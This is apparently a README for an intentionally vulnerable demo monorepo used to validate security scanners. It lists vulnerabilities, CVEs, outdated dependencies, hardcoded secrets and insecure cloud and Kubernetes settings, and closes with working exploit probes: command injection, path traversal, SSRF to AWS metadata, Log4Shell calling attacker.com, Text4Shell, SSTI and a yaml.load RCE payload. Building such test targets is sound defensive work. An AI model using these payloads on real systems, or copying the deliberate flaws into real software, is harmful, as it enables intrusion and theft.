# Sample Monorepo E2E — Intentionally Vulnerable Demo App

> **FOR SECURITY TESTING AND DEMONSTRATION ONLY.**
> This repository contains **purposely vulnerable** code for use with Phoenix Security's
> SAST, SCA, IaC scanning, and secret detection tooling. Do not deploy in production.

## Architecture

```
sample-monorepo-e2e/
├── api/                        Go REST API (SQLi, CMDi, path traversal, SSRF, XSS)
├── frontend/                   Node.js/Express (prototype pollution, SSTI, XSS, CMDi)
├── landing/                    Static HTML (DOM XSS, vulnerable jQuery/AngularJS)
├── webhook/                    Go webhook handler (hardcoded secrets, CMDi, info disclosure)
├── worker/                     Go task worker (CMDi, path traversal, info disclosure)
├── services/
│   ├── java-api/               Java Spring Boot (Log4Shell, Spring4Shell, Text4Shell, deserialization RCE)
│   └── python-worker/          Python Flask (pickle RCE, SSTI, SQLi, yaml.load RCE, XXE)
├── infrastructure/
│   ├── terraform/aws/          Vulnerable IaC (public S3, wide-open SGs, wildcard IAM, no encryption)
│   └── k8s/                    Vulnerable K8s (privileged pods, hostNetwork, RBAC wildcard)
└── shared/                     Shared libs (weak crypto, hardcoded keys, SQL injection helpers)
```

## Vulnerability Coverage

### Code Vulnerabilities (OWASP Top 10)
| ID | Vulnerability | Services |
|----|---------------|----------|
| A01 | Broken Access Control | api, webhook, java-api |
| A02 | Cryptographic Failures | shared/lib/crypto.js, python-worker, webhook |
| A03 | Injection (SQLi, CMDi, SSTI) | api, frontend, java-api, python-worker, worker |
| A04 | Insecure Design | All services |
| A05 | Security Misconfiguration | All services, k8s, terraform |
| A06 | Vulnerable Components | frontend (lodash 4.17.4, jquery 1.11.1), java-api (log4j 2.14.1) |
| A07 | Auth & Identity Failures | webhook, worker, java-api |
| A08 | Software Integrity Failures | java-api (deserialization RCE) |
| A09 | Logging Failures | All services |
| A10 | SSRF | api, java-api, frontend |

### CVEs Represented
| CVE | Description | Service |
|-----|-------------|---------|
| CVE-2021-44228 | Log4Shell — JNDI injection RCE | java-api |
| CVE-2022-22965 | Spring4Shell — RCE | java-api |
| CVE-2022-42889 | Text4Shell — commons-text RCE | java-api |
| CVE-2019-14379 | Jackson deserialization RCE | java-api |
| CVE-2021-39149 | XStream RCE | java-api |
| CVE-2018-3721 | Lodash prototype pollution | frontend |
| CVE-2015-9251 | jQuery XSS via $.ajax | landing |
| CVE-2017-18342 | PyYAML yaml.load RCE | python-worker |
| CVE-2022-21681 | marked XSS | frontend |

### SCA — Vulnerable Dependencies
| Package | Version | CVE | Service |
|---------|---------|-----|---------|
| log4j-core | 2.14.1 | CVE-2021-44228 | java-api |
| commons-text | 1.9 | CVE-2022-42889 | java-api |
| commons-collections | 3.2.1 | CVE-2015-6420 | java-api |
| jackson-databind | 2.9.8 | CVE-2019-14379 | java-api |
| xstream | 1.4.17 | CVE-2021-39149 | java-api |
| lodash | 4.17.4 | CVE-2018-3721 | frontend |
| jquery | 1.11.1 | CVE-2015-9251 | landing, frontend |
| axios | 0.18.0 | CVE-2019-10742 | frontend |
| handlebars | 4.0.11 | CVE-2019-20920 | frontend |
| flask | 0.12.2 | CVE-2018-1000656 | python-worker |
| Pillow | 6.2.0 | CVE-2020-5312 | python-worker |
| PyYAML | 3.13 | CVE-2017-18342 | python-worker |
| golang.org/x/crypto | 0.0.0-20200622 | CVE-2020-29652 | api, webhook, worker |
| golang.org/x/net | 0.0.0-20210119 | CVE-2021-33194 | api, webhook, worker |

### Secrets / Hardcoded Credentials
- AWS access key + secret key (multiple services)
- Database password `password123`
- GitHub PAT (synthetic: `ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345`)
- Flask/JWT signing keys
- Worker and webhook shared secrets
- API keys in source code and Dockerfile ENV

### IaC Vulnerabilities (Terraform + K8s)
- S3 bucket with `public-read` ACL + all public access blocks disabled
- Security group open on all ports to `0.0.0.0/0`
- IAM role + policy with `Action: "*"` on `Resource: "*"`
- EC2 with IMDSv1 (token optional) and `user_data` containing secrets
- RDS publicly accessible, no encryption, default credentials
- K8s: privileged pods, hostNetwork/hostPID/hostIPC, Docker socket mount
- K8s: ClusterRoleBinding granting `*` verbs to default ServiceAccount
- Redis without auth (`--protected-mode no`)

## Running Locally

```bash
docker-compose up --build
```

| Service | URL |
|---------|-----|
| Go API | http://localhost:8080 |
| Node.js Frontend | http://localhost:3000 |
| Webhook | http://localhost:8081 |
| Worker | http://localhost:8082 |
| Python Flask | http://localhost:5000 |
| Java Spring Boot | http://localhost:8083 |

## Example Exploit Probes (for scanner validation)

```bash
# Command Injection
curl "http://localhost:8080/exec?cmd=id;whoami"

# Path Traversal
curl "http://localhost:8080/file?path=../../etc/passwd"

# SSRF (AWS metadata)
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"

# Log4Shell — triggers JNDI lookup via logging
curl -H "X-Api-Version: \${jndi:dns://log4shell.canary.example.com/a}" http://localhost:8083/login?username=\${jndi:ldap://attacker.com/a}

# Text4Shell
curl "http://localhost:8083/template?expr=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"

# SSTI (Python Flask)
curl "http://localhost:5000/template?name={{config.items()}}"

# yaml.load RCE (Python)
curl -X POST -H "Content-Type: text/plain" -d '!!python/object/apply:os.system ["id"]' http://localhost:5000/yaml-load
```
